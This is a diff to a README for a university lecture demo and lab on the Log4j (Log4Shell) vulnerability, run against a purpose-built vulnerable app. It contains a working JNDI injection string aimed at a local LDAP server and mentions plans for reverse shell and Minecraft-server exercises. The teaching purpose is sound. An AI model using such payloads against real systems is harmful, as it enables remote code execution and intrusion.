@@ -5,6 +5,8 @@ In our lecture, we plan to show a progression of malicious intent. From pollutin
 
 This demo focuses on getting an application to run from the vulnerableApp's server. This demo can be used to show the progression from polluting logs to opening an application by entering these strings respectively `${java:version}` and `${jndi:ldap://127.0.0.1:1389/Exploit}.`
 
+For the lab, we're planning to provide the class wiith this website to complete the exercises while we provide support. However, if using a premade lab is not allowed, we will create a similar exercise to get reverse shell access on a real life application (that we create) or a Minecraft server hack on a server running an old version of log4j.
+
 ## Demo 1
 We have created a vulnerableApp which can be exploited via Log4J vulnerability. 
 
